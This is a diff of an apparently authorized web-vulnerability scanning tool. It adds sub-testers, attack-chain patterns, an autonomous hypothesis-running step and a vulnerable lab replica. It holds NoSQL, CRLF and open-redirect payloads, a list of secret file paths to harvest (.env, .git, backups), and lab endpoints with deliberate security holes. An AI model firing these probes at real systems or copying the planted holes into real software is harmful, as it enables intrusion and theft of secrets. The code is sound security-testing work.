@@ -33,12 +33,14 @@ Commands:
                           the 3-gate confirmation engine: baseline → attack →
                           measurable diff (+ confirm token) → CONFIRMED
   chain    detect|plan --target T
-                          8 chain patterns: low findings → high-impact kill chains
+                          10 chain patterns: low findings → high-impact kill chains
   context  set|show --target T
                           session context: endpoints · roles · credentials · functions
   testers  --target T --url U [--url U2…] [--demo]
-                          8 parallel sub-testers (IDOR/AUTHZ/MASSASSIGN/INJECTION/
-                          AUTHN/BIZLOGIC/SSRF/FILEATTACK) over the session context
+                          18 parallel sub-testers (IDOR/AUTHZ/MASSASSIGN/
+                          INJECTION/AUTHN/BIZLOGIC/SSRF/FILEATTACK/JWT/XSS/
+                          SESSION/REDIRECT/CORS/NOSQL/CRLF/HARVEST/DIRECTORY/
+                          REPLAY) over the session context
   coverage --target T     phase × deliverable matrix + ledger histogram + gaps
   report   --target T     the joint war report (findings+chains+phases+detection+pricing)
   relay    init|list|exec|remove
@@ -96,7 +98,7 @@ from pathlib import Path
 sys.path.insert(0, str(Path(__file__).resolve().parent))
 import scope_authority as sa  # noqa: E402
 
-VERSION = "5.2.0"
+VERSION = "5.11.0"
 SCHEMA = 4
 
 
@@ -595,7 +597,7 @@ def cmd_verify(args):
                  "ledger", "gate", "chain", "context", "testers", "coverage",
                  "report", "relay", "campaign", "mandates", "next", "selftest",
                  "crawl", "takeover", "capabilities", "protect", "train",
-                 "memory", "remediate", "watch", "serve", "version"):
+                 "memory", "remediate", "watch", "serve", "version", "catalog"):
         if want not in help_out:
             bad.append(f"subcommand {want}")
     mandate = self.parent.parent / "references" / "mandate.md"
@@ -609,8 +611,8 @@ def cmd_verify(args):
         bad.append("phases != 13")
     if len(CHAIN_PATTERNS) < 8:
         bad.append("chain patterns")
-    if len(TESTERS) != 11:
-        bad.append("testers != 11")
+    if len(TESTERS) != 18:
+        bad.append("testers != 18")
     # docs must carry the same version as the code
     for doc in ("README.md", "SKILL.md", "CHANGELOG.md"):
         p = self.parent.parent / doc
@@ -1427,6 +1429,13 @@ def cmd_bench(args):
 
 
 def cmd_mandate(args):
+    if getattr(args, "session", False):
+        sfile = Path(__file__).resolve().parent.parent / "references" / "mandate-session.md"
+        if args.file:
+            print(str(sfile))
+            return 0
+        print(sfile.read_text())
+        return 0
     mfile = Path(__file__).resolve().parent.parent / "references" / "mandate.md"
     if args.file:
         print(str(mfile))
@@ -1786,7 +1795,7 @@ def _planner_directive(target, url=None, domain=None):
     if url and "testers-run" not in done_ids and "IDOR" not in classes:
         return d("testers-run", "authorization_testing", "spy", "testers",
                  ["testers", "--target", target, "--url", url],
-                 "no access-control findings yet — 8 differential testers, one pass",
+                 "no access-control findings yet — 18 differential testers, one pass",
                  "0-8 ledger rows (deduped, evidence-gated)",
                  ["in-scope only", "documented-PoC payloads"])
     # 6. targeted class holes → focused gate runs, ORDERED BY LEARNED PRIORS
@@ -1818,6 +1827,30 @@ def _planner_directive(target, url=None, domain=None):
                  "2+ confirmed findings — low findings may chain into high impact",
                  "chain-state.json with candidates + plans",
                  ["no novel exploitation"])
+    # 7.5 THE REASONING ENGINE — when the batteries are done but surface
+    # remains, the planner hands the loop to hypothesis generation: the
+    # datasets reason out unconfirmed instances; a model (or the operator)
+    # runs the cards through the same gates.
+    if (ctx.get("endpoints") and "hypothesis-gen" not in done_ids
+            and any(r["status"] == "CONFIRMED" for r in ledger)):
+        return d("hypothesis-gen", "input_validation", "spy", "hypothesis",
+                 ["hypothesis", "gen", "--target", target],
+                 "confirmed classes + untested surface — the reasoning engine "
+                 "ranks unconfirmed instances (variants · cve-map · chains) "
+                 "for the next pass",
+                 "hypothesis-state.json with ranked, wall-checked cards",
+                 ["declared estates only", "documented-PoC adaptation only",
+                  "validation-only · NO-GAIN"])
+    # 7.6 fire the top card — the engine executes its own hypothesis
+    if ("hypothesis-gen" in done_ids and "hypothesis-run" not in done_ids
+            and (camp / "hypothesis-state.json").exists()):
+        return d("hypothesis-run", "input_validation", "spy", "hypothesis",
+                 ["hypothesis", "run", "--target", target],
+                 "the engine ranked the cards — fire the top executable one "
+                 "through the same gates: confirmed → a NEW finding; "
+                 "identical → an honest DISPROVEN",
+                 "a ledger row (CONFIRMED/HYPOTHESIS) or a clean DISPROVEN",
+                 ["declared estates only", "validation-only · NO-GAIN"])
     # 8. detection — the purple leg
     if any(r["status"] == "CONFIRMED" for r in ledger) and "kage-mirror" not in done_ids:
         return d("kage-mirror", "reporting", "kage", "mirror",
@@ -2032,6 +2065,33 @@ def cmd_loop(args):
                  "notes": f"autopilot: {argv_str}"}) + "\n")
         rc = cmd_absorb(type("A", (), {"target": args.target, "file": result_path,
                                        "url": url, "domain": domain})())
+        # TRACE HOOK — the training-data collector: every step records the
+        # directive the state demanded, the result the engine produced, and the
+        # verdict the absorber ruled. This is what the reasoning cell learns from.
+        trace_file = getattr(args, "trace_file", None)
+        if trace_file:
+            findings_before = st.get("_findings_before", 0)
+            findings_after = len(_ledger_load(args.target))
+            st["_findings_before"] = findings_after
+            try:
+                result = json.loads(Path(result_path).read_text())
+            except Exception:
+                result = {}
+            trace = {"ts": _now(), "target": args.target,
+                     "state": {"step": step, "phase": dv["phase"],
+                               "step_number": dv.get("step"),
+                               "prior_findings": findings_before},
+                     "directive": {"id": dv["directive_id"], "mandate": dv["mandate"],
+                                   "argv": dv["argv"], "why": dv.get("why"),
+                                   "expect": dv.get("expect"),
+                                   "walls": dv.get("walls")},
+                     "result": result, "absorb_rc": rc,
+                     "verdict": ("complete" if rc == KERNEL_EXIT["complete"]
+                                 else "blocked" if rc != KERNEL_EXIT["continue"]
+                                 else "continue"),
+                     "new_findings": max(0, findings_after - findings_before)}
+            with open(trace_file, "a") as tf:
+                tf.write(json.dumps(trace) + "\n")
         # count what the pass produced
         total_findings = len(_ledger_load(args.target))
         if rc == KERNEL_EXIT["complete"]:
@@ -2074,6 +2134,8 @@ def _autopilot_argv(dv):
                       "--attack-query", "url=http://127.0.0.1:9/",
                       "--append-query"],
         "chain-detect": [sm, "chain", "detect", "--target", t],
+        "hypothesis-gen": [sm, "hypothesis", "gen", "--target", t],
+        "hypothesis-run": [sm, "hypothesis", "run", "--target", t],
         "kage-mirror": [str(SEC / "kage/scripts/kage.py"), "mirror", "--target", t],
         "shukaku-ingest": [str(SEC / "shukaku/scripts/shukaku.py"),
                            "ingest", "--target", t, "--finding", "kernel",
@@ -3049,7 +3111,12 @@ def _http(url, method="GET", data=None, headers=None, timeout=8):
     family out of scope), caps the body, honors the scope rate limit, and
     returns a structured dict. Never raises."""
     t0 = time.time()
-    sa.rate_wait()
+    from urllib.parse import urlsplit as _us
+    _h = (_us(url).hostname or "").lower()
+    if _h not in ("127.0.0.1", "localhost", "::1", "[::1]"):
+        # the rate limiter protects REMOTE estates; the loopback lab (dojo
+        # replicas, CI, the demo) is never throttled — v5.5.0
+        sa.rate_wait()
     body_bytes = data.encode() if isinstance(data, str) else data
     req = urllib.request.Request(url, method=method.upper(),
                                  data=body_bytes, headers=headers or {})
@@ -3325,11 +3392,63 @@ CHAIN_PATTERNS = [
      "impact": "no idempotency on a money path → double-spend class",
      "plan": "two identical logical requests N=2 (validation-only, zero-balance lab account); kage rule: count_by hash window",
      "severity": "critical"},
+    {"name": "cors_credential_read",
+     "pair": (r"\b(cors|acao|origin.?reflect|cross.?origin)\b", r"\b(credential|session|token|cookie|auth|profile|account)\b"),
+     "impact": "ACAO reflection on an authenticated endpoint → any origin reads the victim's data",
+     "plan": "re-request the credential endpoint with a foreign Origin (read-only; the header triggers no fetch); kage rule on the ACAO reflection",
+     "severity": "high"},
+    {"name": "nosql_authn",
+     "pair": (r"\b(nosql|mongo|\\$ne|\\$gt|\\$regex|operator)\b", r"\b(login|auth|session|password|token)\b"),
+     "impact": "operator syntax evaluated on an auth path → forged authentication",
+     "plan": "one $ne/$gt probe on the login surface (documented-PoC class, one reversible attempt); kage rule on the bypass marker",
+     "severity": "critical"},
     {"name": "custom",
      "pair": None, "impact": "operator-defined pairing — registered via ledger classes",
      "plan": "declare the pair with chain plan --pattern custom --requires 'CLS-A+CLS-B'",
      "severity": "medium"},
 ]
+
+
+def _chainable_estate(target, asset):
+    """Chains describe in-estate kill paths. Third-party assets (github.com/…,
+    lookalike repos, other brands) cannot pair into an estate takeover chain.
+    Uses the same default-deny + implicit-lab verdict as the live-fire gate."""
+    if not asset or asset == "?":
+        return True
+    if _is_lab(asset):
+        return True
+    ok, _, _ = sa.check(asset, strict=True, audit=False, allow_lab=False)
+    if ok:
+        return True
+    scope = _load_scope()
+    if scope is not None:
+        return False  # an authority exists and the asset is outside it
+    # no scope authority — fall back to campaign manifest domain
+    if asset.lower().startswith(("http://", "https://")):
+        from urllib.parse import urlsplit
+        host = urlsplit(asset).netloc or asset
+    else:
+        host = asset.split("/", 1)[0]
+    host = host.split(":", 1)[0]
+    camp = _camp(target)
+    m = _load_json(camp / "manifest.json", {})
+    dom = m.get("domain") or m.get("target") or ""
+    return bool(dom) and (host == dom or host.endswith("." + dom))
+
+
+_NEGATIVE_TITLE = re.compile(
+    r"\b(no real|no admin|not .*infra|lookalike|spa shell|spa fallback|"
+    r"no sensitive surfaces|not .*target|resolve to spa|architecture note)\b",
+    re.IGNORECASE)
+
+
+def _chainable_signal(target, s):
+    """A signal may only feed chain detection when its asset is in the estate
+    and its own text is not a documented negative (SPA shell, lookalike repo,
+    no admin surface). Auto-detected chains get poisoned by exactly those."""
+    if _NEGATIVE_TITLE.search(f"{s.get('title','')} {s.get('asset','')}"):
+        return False
+    return _chainable_estate(target, s.get("asset"))
 
 
 def _confirmed_signals(target):
@@ -3347,8 +3466,11 @@ def _confirmed_signals(target):
         for s in u.get("surface", []) + u.get("logic", []):
             if s.get("status") == "CONFIRMED":
                 asset = s.get("endpoint") or s.get("where") or s.get("seam") or "?"
+                # stable id: content-derived, not a running counter — a counter
+                # renumbers as the ledger grows, orphaning saved chain entries
+                h = hashlib.sha1(asset.encode("utf-8", "replace")).hexdigest()[:6]
                 title = s.get("seam") or s.get("note") or "undercroft confirmed seam"
-                out.append({"id": f"UND-{len(out)+1:03d}", "title": title,
+                out.append({"id": f"UND-{h}", "title": title,
                             "cls": "UNDERCROFT", "asset": asset, "source": source,
                             "severity": "high"})
     h = _load_json(camp / "harvest-state.json", {})
@@ -3434,7 +3556,8 @@ def cmd_chain(args):
                   f" conf={c['confidence']:.2f} {c['status']:8s} "
                   f"{' + '.join(c.get('entry_ids', []))[:70]}")
         return 0
-    signals = _confirmed_signals(args.target)
+    signals = [s for s in _confirmed_signals(args.target)
+               if _chainable_signal(args.target, s)]
     if getattr(args, "include_hypothesis", False):
         signals += [{"id": r.get("id", "?"), "title": r.get("title", ""),
                      "cls": r.get("cls", "GENERAL"), "asset": r.get("asset", "?"),
@@ -3586,7 +3709,7 @@ def cmd_context(args):
     return 0
 
 
-# ── 3.6 the 8 parallel sub-testers ────────────────────────────────────────────
+# ── 3.6 the 18 parallel sub-testers ───────────────────────────────────────────
 
 def _t_requests_removed():  # removed — differential requests are built in run_tester
     pass
@@ -3667,11 +3790,68 @@ TESTERS = [
      "signatures": ("admin", "role", "true"),
      "logic": "session identifier structure trusted — sequential/weak ids "
               "enumerated (CWE-384 class)"},
+    # ── v5.5.0 THE BATTERY EXPANSION — seven new classes ────────────────────
+    {"name": "REDIRECT", "cls": "REDIRECT",
+     "params": ("next", "redirect", "url", "return", "returnTo", "goto", "dest",
+                "continue", "target", "rurl", "forward"),
+     "attacks": lambda v: (["//redirect.probe.invalid/x", "/\\redirect.probe.invalid/x",
+                            "https://redirect.probe.invalid/x",
+                            "https:////redirect.probe.invalid/x",
+                            "/%2f%2eredirect.probe.invalid/x"]),
+     "logic": "redirect target trusted from input — Location swaps to a foreign "
+              "origin (probe uses the .invalid TLD: it never resolves, so no "
+              "third party is ever contacted — CWE-601 class)"},
+    {"name": "CORS", "cls": "CORS",
+     "params": (),
+     "attacks": lambda v: ["https://cors.probe.invalid"],
+     "logic": "Origin reflected into Access-Control-Allow-Origin with credentials "
+              "— any site reads authenticated responses (CWE-942 class; the "
+              "Origin header triggers no fetch — read-only)"},
+    {"name": "NOSQL", "cls": "NOSQL",
+     "params": ("user", "username", "email", "pass", "password", "login", "q"),
+     "attacks": lambda v: (['{"$ne":null}', "[$ne]=1", '{"$gt":""}', "$gt",
+                            "[$regex]=.*", '{"$regex":".*"}', "true, $where: '1'"]),
+     "signatures": ('"authenticated": true', '"role": "admin"', '"bypass": true'),
+     "logic": "operator syntax reaches a document interpreter — $ne/$gt/$regex "
+              "evaluate server-side (CWE-943 class)"},
+    {"name": "CRLF", "cls": "CRLF",
+     "params": ("next", "redirect", "page", "lang", "url", "path", "name", "q"),
+     "attacks": lambda v: ([f"{v}%0d%0aX-Probe: spy", f"{v}%0d%0aSet-Cookie: spy=1",
+                            f"{v}%0a%0dX-Probe: spy", f"{v}\r\nX-Probe: spy"]),
+     "logic": "input carried into response headers unnormalized — CRLF splits "
+              "the response / injects headers (CWE-113 class; marker header "
+              "only, nothing set on any real session)"},
+    {"name": "HARVEST", "cls": "HARVEST",
+     "params": (),
+     "attacks": lambda v: [],
+     "paths": (".env", ".git/HEAD", ".svn/entries", ".DS_Store", "backup.zip",
+               "backup.sql", "dump.sql", "debug", "phpinfo", "phpinfo.php",
+               "actuator/env", "swagger.json", "api-docs", ".well-known/security.txt",
+               "server-status"),
+     "signatures": ("secret", "api_key", "apikey", "password=", "ref: refs/",
+                    "BEGIN PRIVATE KEY", "phpinfo()", "DATABASE_URL",
+                    "{\"paths\"", "swagger", "\"openapi\"", "disk_free"),
+     "logic": "sensitive material served at predictable paths — config, VCS "
+              "metadata, dumps, debug surfaces (GET-only, count-only: NO-GAIN)"},
+    {"name": "DIRECTORY", "cls": "DIRECTORY",
+     "params": (),
+     "attacks": lambda v: [],
+     "paths": ("files/", "backup/", "static/", "data/", "uploads/", "images/",
+               "assets/", "archive/", "old/", "test/"),
+     "signatures": ("index of /", "<title>directory listing", "parent directory"),
+     "logic": "autoindex left on at predictable roots — full tree enumeration "
+              "(GET-only, read-only: CWE-548 class)"},
+    {"name": "REPLAY", "cls": "REPLAY",
+     "params": (),
+     "attacks": lambda v: [],
+     "logic": "state-changing endpoint lacks idempotency — the same logical "
+              "request fired twice produces a second effect (N=2, validation-"
+              "only, zero-balance lab accounts — CWE-837 class)"},
 ]
 
 
 def _demo_replica():
-    """A lab-bound vulnerable replica (like dojo's): the 8 testers have something
+    """A lab-bound vulnerable replica (like dojo's): the 18 testers have something
     REAL to strike with zero setup. 127.0.0.1 only, self-terminating."""
     from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
     state = {"replay_hits": 0}
@@ -3689,11 +3869,21 @@ def _demo_replica():
         def log_message(self, *a):
             pass
 
-        def _send(self, code, body, ctype="application/json"):
+        def _send(self, code, body, ctype="application/json",
+                  extra_headers=None, raw_header_value=None):
             b = body.encode()
             self.send_response(code)
             self.send_header("Content-Type", ctype)
             self.send_header("Content-Length", str(len(b)))
+            # v5.5.0 — the CRLF flaw: a raw value is carried into the header
+            # block unnormalized (a split/injected header is the proof)
+            if raw_header_value:
+                for part in raw_header_value.replace("\r\n", "\n").split("\n"):
+                    if ":" in part:
+                        hk, _, hv = part.partition(":")
+                        self.send_header(hk.strip(), hv.strip())
+            for hk, hv in (extra_headers or {}).items():
+                self.send_header(hk, hv)
             self.end_headers()
             self.wfile.write(b)
 
@@ -3736,6 +3926,53 @@ def _demo_replica():
                 self._send(200, json.dumps({"discount": v, "applied": v != 0}))
             elif p == "/role":
                 self._send(200, json.dumps({"role": q.get("role", "user"), "menu": "full" if q.get("role") == "admin" else "basic"}))
+            # ── v5.5.0 the battery-expansion flaws ──────────────────────────
+            elif p == "/redirect":
+                # open redirect: the next param is trusted raw (CWE-601)
+                self.send_response(302)
+                self.send_header("Location", q.get("next", "/home"))
+                self.send_header("Content-Length", "0")
+                self.end_headers()
+            elif p == "/api/data":
+                # CORS misconfig: any Origin reflected with credentials (CWE-942)
+                org = self.headers.get("Origin") or "null"
+                self._send(200, json.dumps({"data": "session-scoped"}),
+                           extra_headers={"Access-Control-Allow-Origin": org,
+                                          "Access-Control-Allow-Credentials": "true"})
+            elif p == "/api/login2":
+                # NoSQL operator injection: $ne/$gt/$regex evaluate (CWE-943)
+                pw = q.get("pass", "")
+                bypass = any(m in pw for m in ("$ne", "$gt", "$regex", "[$"))
+                self._send(200, json.dumps(
+                    {"authenticated": bypass or pw == "known",
+                     "role": "admin" if bypass else "user"}))
+            elif p == "/greet":
+                # CRLF: the name value is carried into a response header raw
+                name = q.get("name", "")
+                self._send(200, f"hello {name}", "text/html",
+                           raw_header_value=name if ("\r" in name or "\n" in name) else None)
+            elif p in ("/.env", "/.git/HEAD", "/debug", "/phpinfo",
+                       "/actuator/env", "/backup.zip"):
+                # HARVEST: sensitive material at predictable paths (NO-GAIN:
+                # the material is fake, the flaw is the serving)
+                material = {
+                    "/.env": "SECRET_KEY=spydermonkey-lab\nDATABASE_URL=postgres://lab",
+                    "/.git/HEAD": "ref: refs/heads/main\n",
+                    "/debug": json.dumps({"paths": ["/api"], "debug": True,
+                                          "secret_hint": "SECRET_KEY=***"}),
+                    "/phpinfo": "phpinfo() PHP Version => 8.1 … SECRET_KEY=spydermonkey-lab",
+                    "/actuator/env": json.dumps({"paths": [], "active": "prod"}),
+                    "/backup.zip": "PK\x03\x04 backup dump password=lab-backup",
+                }[p]
+                self._send(200, material, "text/plain")
+            elif p in ("/files/", "/backup/", "/static/", "/data/", "/uploads/"):
+                # DIRECTORY: autoindex left on at one root (CWE-548)
+                if p == "/files/":
+                    self._send(200, "<title>Index of /files</title>"
+                               "<a href=\"../\">Parent Directory</a>"
+                               "<a href=\"a.txt\">a.txt</a>", "text/html")
+                else:
+                    self._send(404, "nope", "text/plain")
             else:
                 self._send(404, "not found", "text/plain")
 
@@ -3765,12 +4002,20 @@ def _tester_verdict(t: dict, payload: str, b: dict, a: dict) -> tuple[bool, bool
     """
     diff = ((b["status"], len(b["body"]), b["sha256"])
             != (a["status"], len(a["body"]), a["sha256"]))
+    name = t["name"]
+    if not diff and name in ("CORS", "CRLF", "REDIRECT"):
+        # header-evidence classes prove in the HEADERS, not the body — a
+        # body-identical pair with a header delta is still a live differential
+        # (volatile headers excluded so the clock never becomes a finding)
+        volatile = {"date", "server", "content-length"}
+        _sig = lambda d: {k: v for k, v in (d.get("headers") or {}).items()
+                          if k not in volatile}
+        diff = _sig(b) != _sig(a)
     if not diff:
         return False, False, "identical responses"
     low = (a["body"] or "").lower()
     atk = (payload or "").lower()
     reflected = bool(atk) and atk in low
-    name = t["name"]
     if name == "INJECTION":
         if "7*7" in atk:
             evaluated = "49" in low and "{{7*7}}" not in low and "${7*7}" not in low
@@ -3832,6 +4077,64 @@ def _tester_verdict(t: dict, payload: str, b: dict, a: dict) -> tuple[bool, bool
                                   '"balance": 999999', '"price": 0')):
             return True, True, "unexpected writable field accepted"
         return True, False, "differential without writable-field evidence"
+    if name == "REDIRECT":
+        # the proof lives in the Location header: the attack response points at
+        # a FOREIGN origin while the baseline pointed at the target itself
+        al = (a.get("headers") or {}).get("location", "")
+        bl = (b.get("headers") or {}).get("location", "")
+        if al and al != bl and "probe.invalid" in al.lower():
+            return True, True, "Location swapped to a foreign origin"
+        if al and al != bl:
+            return True, False, "Location changed without a foreign origin"
+        return True, False, "differential without Location evidence"
+    if name == "CORS":
+        acao = (a.get("headers") or {}).get("access-control-allow-origin", "")
+        acac = (a.get("headers") or {}).get("access-control-allow-credentials", "")
+        b_acao = (b.get("headers") or {}).get("access-control-allow-origin", "")
+        if acao and acao != b_acao:
+            if acao == "*" and acac == "true":
+                return True, True, "wildcard ACAO with allow-credentials"
+            if "probe.invalid" in acao:
+                return True, True, "foreign Origin echoed into ACAO"
+            return True, False, "ACAO present without foreign-origin reflection"
+        return True, False, "differential without ACAO evidence"
+    if name == "NOSQL":
+        if any(s in low for s in ('"authenticated": true', '"role": "admin"',
+                                  '"bypass": true', '"login": "ok"')):
+            return True, True, "operator payload evaluated — auth bypass marker"
+        return True, False, "differential without auth-bypass evidence"
+    if name == "CRLF":
+        # the injected marker header must appear in the ATTACK response's
+        # headers and not in the baseline's — that is the split proof
+        a_keys = {k for k in (a.get("headers") or {})}
+        b_keys = {k for k in (b.get("headers") or {})}
+        injected = a_keys - b_keys
+        if any(k in injected for k in ("x-probe", "set-cookie")):
+            return True, True, "attacker-controlled header injected into the response"
+        if "x-probe" in low or "set-cookie: spy" in low:
+            return True, False, "CRLF reflected in the body, not the headers"
+        return True, False, "differential without header-injection evidence"
+    if name == "HARVEST":
+        if any(s in low for s in t.get("signatures", ())):
+            return True, True, "sensitive material served at a predictable path"
+        return True, False, "differential without sensitive-content evidence"
+    if name == "DIRECTORY":
+        if any(s in low for s in t.get("signatures", ())):
+            return True, True, "autoindex listing served"
+        return True, False, "differential without listing evidence"
+    if name == "REPLAY":
+        # the effects counter incremented across two identical logical requests
+        def _effects(d):
+            import re as _re
+            m = _re.search(r'"(?:effects|count|applied|accepted|processed)"\s*:\s*(\d+)',
+                           (d.get("body") or ""))
+            return int(m.group(1)) if m else None
+        e_b, e_a = _effects(b), _effects(a)
+        if e_b is not None and e_a is not None and e_a > e_b:
+            return True, True, f"effect repeated on replay ({e_b} → {e_a})"
+        if e_b is None and e_a is None:
+            return False, False, "no countable effect on this endpoint"
+        return True, False, "state changed without a countable effect"
     return True, True, "differential"
 
 
@@ -4251,6 +4554,128 @@ def cmd_remediate(args):
     return 0 if (fixed is not False) else 1
 
 
+_CATALOG_CACHE = None
+
+def _catalog() -> list:
+    """THE KNOWN-TOOL CATALOG — lazy-loaded once per process. This is a
+    reference index of known offensive tooling (names, categories, one-line
+    descriptions, source pedigree). It NEVER executes anything: firing any of
+    these goes through `arsenal` (installed tools only, scope-gated, kernel
+    result schema). Nothing in here is a weapon; it is a map."""
+    global _CATALOG_CACHE
+    if _CATALOG_CACHE is None:
+        p = Path(__file__).resolve().parent.parent / "references" / "tool-catalog.json"
+        try:
+            _CATALOG_CACHE = json.loads(p.read_text(encoding="utf-8"))
+            if not isinstance(_CATALOG_CACHE, list):
+                _CATALOG_CACHE = []
+        except Exception:
+            _CATALOG_CACHE = []
+    return _CATALOG_CACHE
+
+
+def cmd_catalog(args) -> int:
+    cat = _catalog()
+    action = getattr(args, "action", "stats") or "stats"
+    cat_filter = (getattr(args, "cat", None) or "").lower().strip()
+    limit = max(1, int(getattr(args, "limit", 50) or 50))
+    term = getattr(args, "term", None) or ""
+
+    def _rows(rows):
+        return [{"name": r.get("name"), "cat": r.get("cat"),
+                 "desc": r.get("desc"), "mode": r.get("mode"),
+                 "src": r.get("src", "curated")} for r in rows]
+
+    def _filtered(rows):
+        if not cat_filter:
+            return list(rows)
+        return [r for r in rows if (r.get("cat") or "").lower().startswith(cat_filter)]
+
+    if action == "stats":
+        from collections import Counter
+        top = Counter((r.get("cat") or "?").split("/")[0] for r in cat)
+        mode = Counter(r.get("mode") for r in cat)
+        src = Counter(r.get("src", "curated") for r in cat)
+        if getattr(args, "json", False):
+            print(json.dumps({"entries": len(cat), "by_top": dict(top.most_common()),
+                              "by_mode": dict(mode), "by_src": dict(src),
+                              "note": "metadata only — execution via arsenal (scope-gated)"},
+                             indent=2))
+            return 0
+        print(f"═══ KNOWN TOOL CATALOG — {len(cat)} tools ═══")
+        print("  reference index · nothing here executes · arsenal fires installed tools, scope-gated")
+        for k, v in top.most_common():
+            print(f"  {k:12s} {v}")
+        print(f"  mode: {dict(mode)} · source: {dict(src)}")
+        return 0
+
+    if action == "categories":
+        from collections import Counter
+        c = Counter(r.get("cat") for r in _filtered(cat))
+        if getattr(args, "json", False):
+            print(json.dumps({"categories": [{"cat": k, "count": v}
+                                             for k, v in c.most_common()]}, indent=2))
+            return 0
+        for k, v in c.most_common():
+            print(f"  {k:24s} {v}")
+        return 0
+
+    if action == "list":
+        rows = _filtered(cat)
+        total = len(rows)
+        rows = rows[:limit]
+        if getattr(args, "json", False):
+            print(json.dumps({"count": total, "limit": limit, "tools": _rows(rows)}, indent=2))
+            return 0
+        print(f"═══ CATALOG — {total} matching (showing {len(rows)}, --limit to raise) ═══")
+        for r in rows:
+            print(f"  {r['name']:28s} [{r.get('cat')}] {r.get('desc')}")
+        print("  info only — arsenal fires installed tools, scope-gated")
+        return 0
+
+    if action == "search":
+        q = term.lower().strip()
+        if not q:
+            raise UsageError("catalog search needs a term")
+        rows = [r for r in cat
+                if q in (r.get("name") or "").lower()
+                or q in (r.get("desc") or "").lower()
+                or q in (r.get("cat") or "").lower()]
+        rows = _filtered(rows)
+        total = len(rows)
+        rows = rows[:limit]
+        if getattr(args, "json", False):
+            print(json.dumps({"term": term, "count": total, "limit": limit,
+                              "tools": _rows(rows)}, indent=2))
+            return 0
+        print(f"═══ CATALOG SEARCH '{term}' — {total} hit(s) ═══")
+        for r in rows:
+            print(f"  {r['name']:28s} [{r.get('cat')}] {r.get('desc')}")
+        return 0
+
+    if action == "show":
+        q = term.lower().strip()
+        if not q:
+            raise UsageError("catalog show needs a tool name")
+        exact = [r for r in cat if (r.get("name") or "").lower() == q]
+        r = (exact or [r for r in cat if q in (r.get("name") or "").lower()] or [None])[0]
+        if not r:
+            print(f"✗ catalog: no tool named '{term}'", file=sys.stderr)
+            return 1
+        if getattr(args, "json", False):
+            print(json.dumps({"tool": _rows([r])[0]}, indent=2))
+            return 0
+        print(f"═══ {r['name']} ═══")
+        print(f"  category : {r.get('cat')}")
+        print(f"  mode     : {r.get('mode')}")
+        print(f"  source   : {r.get('src', 'curated')}")
+        print(f"  about    : {r.get('desc')}")
+        print("  NOTE: reference only — execution goes through `arsenal` (scope-gated)")
+        return 0
+
+    raise UsageError(f"catalog: unknown action '{action}'")
+
+
 def cmd_watch(args):
     """THE UNATTENDED RUNNER — the campaign daemon: every cycle = one kernel
     loop pass + the war report + estate memory + an optional notify command.
@@ -4264,7 +4689,9 @@ def cmd_watch(args):
         print(f"\n▸ cycle {cycle}: the loop pass")
         r = subprocess.run([sys.executable, sm, "loop", "--target", args.target,
                             "--url", args.url, "--domain", args.domain,
-                            "--max-steps", str(args.max_steps)],
+                            "--max-steps", str(args.max_steps)]
+                           + (["--trace-file", args.trace_file]
+                              if getattr(args, "trace_file", None) else []),
                            timeout=args.cycle_timeout * 60)
         if r.returncode not in (0, 5):
             print(f"  ⚠ loop exited {r.returncode} — watch continues (the walls held)")
@@ -4603,7 +5030,12 @@ def cmd_testers(args):
                     base + "/api/token?token=abc",
                     base + "/api/coupon?amount=5",
                     base + "/role?role=user",
-                    base + "/api/user?name=bob&email=bob@lab"]
+                    base + "/api/user?name=bob&email=bob@lab",
+                    base + "/redirect?next=/home",
+                    base + "/api/data",
+                    base + "/api/login2?user=admin&pass=y",
+                    base + "/greet?name=bob",
+                    base + "/api/webhook"]
         if not json_mode:
             print("▸ demo mode: built-in lab replica serving (self-terminating at exit)")
     urls = [u for u in (args.url or []) if u]
@@ -4620,11 +5052,12 @@ def cmd_testers(args):
     timeout = max(1, min(int(getattr(args, "timeout", 8) or 8), 30))
     results = {}
     if not json_mode:
-        print(f"═══ SPYDERMONKEY TESTERS — 8 sub-testers in PARALLEL over {len(urls)} url(s) ═══")
+        print(f"═══ SPYDERMONKEY TESTERS — {len(TESTERS)} sub-testers in PARALLEL over {len(urls)} url(s) ═══")
 
     def run_tester(t):
         from urllib.parse import urlsplit, parse_qsl, urlencode, urlunsplit
         hits = []
+        probed_roots: set = set()
         for u in urls:
             sp = urlsplit(u)
             params = dict(parse_qsl(sp.query, keep_blank_values=True))
@@ -4649,6 +5082,60 @@ def cmd_testers(args):
                                  "attack": _gate_brief(a), "url": u,
                                  "decisive": decisive, "reason": reason,
                                  "stable": stable})
+                continue
+            if t["name"] == "CORS":
+                # v5.5.0 — the Origin-reflection differential: the baseline
+                # carries a neutral Origin, the attack a foreign one. The
+                # Origin header triggers no fetch — this probe is read-only.
+                origin = t["attacks"]("")[0]
+                b1 = _http(base, headers={"Origin": "https://baseline.probe.invalid"},
+                           timeout=timeout)
+                a = _http(base, headers={"Origin": origin}, timeout=timeout)
+                hit, decisive, reason = _tester_verdict(t, origin, b1, a)
+                if hit:
+                    hits.append({"param": "Origin", "original": "baseline.probe.invalid",
+                                 "payload": origin, "baseline": _gate_brief(b1),
+                                 "attack": _gate_brief(a), "url": u,
+                                 "decisive": decisive, "reason": reason,
+                                 "stable": True})
+                continue
+            if t["name"] in ("HARVEST", "DIRECTORY"):
+                # v5.5.0 — the path-probe differential: a guaranteed-missing
+                # control path is the baseline; each candidate path is the
+                # attack. A soft-404 target answers both identically and
+                # registers NOTHING (the early identical-response gate).
+                # Paths are origin-relative — each distinct ORIGIN is probed
+                # once, not once per URL (13 urls on one host = one sweep).
+                root = urlunsplit((sp.scheme, sp.netloc, "/", "", ""))
+                if root in probed_roots:
+                    continue
+                probed_roots.add(root)
+                ctrl = _http(root + "__spydermonkey_control__", timeout=timeout)
+                for path in t["paths"]:
+                    a = _http(root + path, timeout=timeout)
+                    hit, decisive, reason = _tester_verdict(t, path, ctrl, a)
+                    if hit:
+                        hits.append({"param": "path", "original": "(none)",
+                                     "payload": "/" + path,
+                                     "baseline": _gate_brief(ctrl),
+                                     "attack": _gate_brief(a), "url": root,
+                                     "decisive": decisive, "reason": reason,
+                                     "stable": True})
+                continue
+            if t["name"] == "REPLAY":
+                # v5.5.0 — the idempotency differential: the SAME logical
+                # request fired twice (N=2, validation-only). A countable
+                # effect that increments is the proof.
+                b1 = _http(u, timeout=timeout)
+                a = _http(u, timeout=timeout)
+                hit, decisive, reason = _tester_verdict(t, "(replay)", b1, a)
+                if hit:
